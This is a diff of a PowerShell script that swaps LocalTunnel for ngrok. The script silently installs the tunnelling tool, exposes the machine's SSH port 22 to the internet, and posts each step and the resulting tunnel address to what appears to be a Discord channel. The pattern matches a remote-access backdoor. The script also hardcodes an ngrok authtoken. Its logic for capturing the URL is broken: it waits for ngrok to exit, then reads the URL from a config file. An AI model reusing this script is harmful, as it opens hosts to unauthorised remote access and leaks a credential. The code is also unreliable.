@@ -64,35 +64,35 @@ try {
     $Port = 22
     Send-DiscordMessage "SSH Port: $Port"
 
-    # Install Node.js and LocalTunnel if not installed
-    Send-DiscordMessage "Checking for Node.js and LocalTunnel installation..."
-    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
-        Send-DiscordMessage "Node.js not found. Installing Node.js..."
-        Invoke-WebRequest -Uri https://nodejs.org/dist/v16.17.1/node-v16.17.1-x64.msi -OutFile "$env:TEMP\nodejs.msi"
-        Start-Process msiexec.exe -ArgumentList "/i", "$env:TEMP\nodejs.msi", "/quiet", "/norestart" -Wait
-        Remove-Item "$env:TEMP\nodejs.msi"
-        Send-DiscordMessage "Node.js installed successfully."
+    # Install ngrok if not installed
+    Send-DiscordMessage "Checking for ngrok installation..."
+    if (-not (Get-Command ngrok -ErrorAction SilentlyContinue)) {
+        Send-DiscordMessage "ngrok not found. Installing ngrok..."
+        Invoke-WebRequest -Uri https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile "$env:TEMP\ngrok.zip"
+        Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:ProgramFiles"
+        Remove-Item "$env:TEMP\ngrok.zip"
+        Send-DiscordMessage "ngrok installed successfully."
     } else {
-        Send-DiscordMessage "Node.js already installed."
+        Send-DiscordMessage "ngrok already installed."
     }
 
-    # Install LocalTunnel globally if not installed
-    if (-not (Get-Command lt -ErrorAction SilentlyContinue)) {
-        Send-DiscordMessage "LocalTunnel not found. Installing LocalTunnel..."
-        npm install -g localtunnel
-        Send-DiscordMessage "LocalTunnel installed successfully."
-    } else {
-        Send-DiscordMessage "LocalTunnel already installed."
-    }
+    # Enter your ngrok authtoken here (with your actual token)
+    $NgrokAuthToken = "2WU1ah9rzwH5TgeVVhhajS9IqM3_4mALPaeeqrwccVETjceEb"
 
-    # Setting up SSH tunnel using LocalTunnel
-    Send-DiscordMessage "Setting up SSH tunnel using LocalTunnel..."
-    $TunnelProcess = Start-Process -FilePath "lt" -ArgumentList "--port 22" -PassThru
+    # Configure ngrok with authtoken
+    Send-DiscordMessage "Configuring ngrok with authtoken..."
+    Start-Process -FilePath "$env:ProgramFiles\ngrok.exe" -ArgumentList "authtoken", $NgrokAuthToken -NoNewWindow -Wait
+    Send-DiscordMessage "ngrok configured successfully."
+
+    # Set up SSH tunnel using ngrok
+    Send-DiscordMessage "Setting up SSH tunnel using ngrok..."
+    $TunnelProcess = Start-Process -FilePath "$env:ProgramFiles\ngrok.exe" -ArgumentList "tcp", "22" -PassThru
     $TunnelProcess.WaitForExit()
 
-    # Assuming LocalTunnel will output a URL with the tunnel info
-    # Capture the URL from LocalTunnel
-    $TunnelURL = "http://your-subdomain.localtunnel.me"  # Replace with actual URL from LocalTunnel if you capture it programmatically
+    # Capture the public URL from ngrok (output of the command)
+    Start-Sleep -Seconds 5  # Wait for ngrok to generate the URL
+    $NgrokStatus = Get-Content "$env:ProgramFiles\ngrok.yml" -Raw
+    $TunnelURL = ($NgrokStatus | Select-String -Pattern "tcp://.*" | ForEach-Object { $_.Line.Trim() })
     Send-DiscordMessage "SSH Tunnel setup complete. Tunnel URL: $TunnelURL"
 
     # Final message
